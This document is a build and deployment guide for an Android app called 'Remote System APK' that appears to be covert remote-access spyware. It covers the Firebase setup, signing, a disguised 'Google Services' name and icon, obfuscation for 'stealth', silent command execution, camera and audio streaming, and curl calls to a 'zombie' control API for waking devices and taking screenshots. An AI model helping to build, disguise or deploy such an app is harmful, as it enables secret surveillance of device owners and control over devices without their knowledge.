# APK Building Guide - Ghost Resurrection System

## Overview
Complete guide for building the Remote System APK with Ghost Resurrection capabilities in Android Studio. This creates a production-ready APK with Firebase Cloud Messaging integration.

## 🔧 Prerequisites

### Required Software
- **Android Studio Hedgehog** (2023.1.1) or later
- **Java Development Kit (JDK) 11** or later
- **Android SDK API Level 35** (Android 15)
- **Git** for cloning the repository

### System Requirements
- **RAM**: 8GB minimum (16GB recommended)
- **Storage**: 10GB free space
- **OS**: Windows 10/11, macOS 10.14+, or Ubuntu 18.04+

## 📁 Project Setup

### 1. Clone Repository
```bash
git clone https://github.com/your-repo/Remote-System-APK.git
cd Remote-System-APK
```

### 2. Open in Android Studio
1. Launch Android Studio
2. Click **"Open an Existing Project"**
3. Navigate to `/workspaces/Remote-System-APK/APK/`
4. Click **"OK"** to open the project

### 3. Gradle Sync
Android Studio will automatically trigger Gradle sync. If not:
1. Click **"Sync Now"** in the notification bar
2. Or go to **File → Sync Project with Gradle Files**

## 🔥 Firebase Configuration

### Replace Placeholder Files
Before building, replace placeholder Firebase configuration:

#### Android App Configuration
```bash
# Replace google-services.json with your real Firebase config
cp ~/Downloads/google-services.json ./APK/app/google-services.json
```

#### Server Configuration  
```bash
# Replace Firebase service account with real credentials
cp ~/Downloads/your-firebase-adminsdk.json ./SERVER/simple-server/firebase-service-account.json
```

**⚠️ Important**: Without real Firebase credentials, FCM features will be disabled.

## 🏗️ Building the APK

### Debug Build (for Testing)
```bash
cd /workspaces/Remote-System-APK/APK/
./gradlew assembleDebug
```

**Output**: `app/build/outputs/apk/debug/app-debug.apk`

### Release Build (for Distribution)
```bash
cd /workspaces/Remote-System-APK/APK/
./gradlew assembleRelease
```

**Output**: `app/build/outputs/apk/release/app-release-unsigned.apk`

### Android Studio Build
1. In Android Studio, click **Build → Build Bundle(s) / APK(s) → Build APK(s)**
2. Wait for build to complete
3. Click **"locate"** link to find the APK file

## 🔐 APK Signing (Release)

### Generate Signing Key
```bash
keytool -genkey -v -keystore remote-system.keystore -alias remote-system -keyalg RSA -keysize 2048 -validity 10000
```

### Sign APK
```bash
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore remote-system.keystore app-release-unsigned.apk remote-system

# Align APK
zipalign -v 4 app-release-unsigned.apk remote-system-release.apk
```

## 📱 Installation & Testing

### Install Debug APK
```bash
# Via ADB
adb install app/build/outputs/apk/debug/app-debug.apk

# Via Android Studio
# Click Run button or Shift+F10
```

### Install Release APK
```bash
# Transfer to device and install manually
# Or use ADB:
adb install remote-system-release.apk
```

### Verify Installation
1. Launch **"Google Services"** app (disguised name)
2. Check that app requests permissions
3. Verify server connection in status

## 🧪 Testing Ghost Resurrection

### 1. Start Server
```bash
cd /workspaces/Remote-System-APK/SERVER/simple-server/
npm install
npm start
```

### 2. Test Device Registration
1. Launch Android app
2. Check server logs for device registration
3. Look for FCM token registration

### 3. Test Remote Commands
```bash
# Get registered devices
curl http://localhost:3000/api/zombie/devices

# Wake up device
curl -X POST http://localhost:3000/api/zombie/wake/YOUR_DEVICE_ID

# Send screenshot command
curl -X POST http://localhost:3000/api/zombie/YOUR_DEVICE_ID/command \
  -H "Content-Type: application/json" \
  -d '{"command": "screenshot"}'
```

### 4. Test Master Control Panel
1. Open http://localhost:3000/master-control-panel.html
2. Verify device appears in zombie army grid
3. Test command execution from dashboard

## 🎯 Advanced Build Options

### Custom Build Variants
Edit `app/build.gradle.kts` to add custom build variants:

```kotlin
android {
    buildTypes {
        create("stealth") {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
    }
}
```

### Obfuscation (Stealth Mode)
For maximum stealth, enable ProGuard obfuscation:

```kotlin
buildTypes {
    release {
        isMinifyEnabled = true
        isShrinkResources = true
        proguardFiles(
            getDefaultProguardFile("proguard-android-optimize.txt"), 
            "proguard-rules.pro"
        )
    }
}
```

### Custom App Icon
Replace app icon for better disguise:
1. Place icon files in `app/src/main/res/mipmap-*/`
2. Update `android:icon` in `AndroidManifest.xml`

## 🚨 Troubleshooting

### Build Errors

#### "Failed to resolve Firebase dependencies"
```bash
# Check internet connection and retry
./gradlew --refresh-dependencies assembleDebug
```

#### "google-services.json not found"
- Ensure `google-services.json` is in `app/` directory
- Verify file is valid JSON format

#### "Execution failed for task ':app:processDebugGoogleServices'"
- Check that `package_name` in `google-services.json` matches `applicationId` in `build.gradle.kts`
- Should be: `com.remote.system`

### Runtime Issues

#### "FCM registration failed"
- Verify device has internet connection
- Check Firebase project configuration
- Ensure Google Play Services is installed on device

#### "Permission denied" errors
- Grant all requested permissions in Android settings
- Check for missing permission declarations in manifest

### APK Installation Issues

#### "App not installed" 
- Enable "Unknown sources" in Android settings
- Check APK signature if using release build
- Ensure sufficient storage space

## 📦 Final APK Properties

### Debug APK Features
- ✅ Full Ghost Resurrection System
- ✅ FCM remote wake-up (with real Firebase)
- ✅ All command execution capabilities
- ✅ Live streaming support
- ✅ Master control panel integration
- ✅ Debug logging enabled

### Release APK Features  
- ✅ All debug features
- ✅ Optimized and obfuscated code
- ✅ Smaller file size
- ✅ Production-ready performance
- ✅ Enhanced stealth capabilities

## 🎉 Success!

Your Remote System APK with Ghost Resurrection capabilities is now built and ready for deployment. The APK includes:

- **Firebase Cloud Messaging** for remote device wake-up
- **Smart timeout system** (8-minute auto-shutdown)
- **Silent command execution** via FCM
- **Live streaming capabilities** (camera/audio)
- **Complete stealth operation** with disguised notifications
- **Master control panel** integration
- **Zombie army management** support

The system is now ready for real-world testing and deployment!
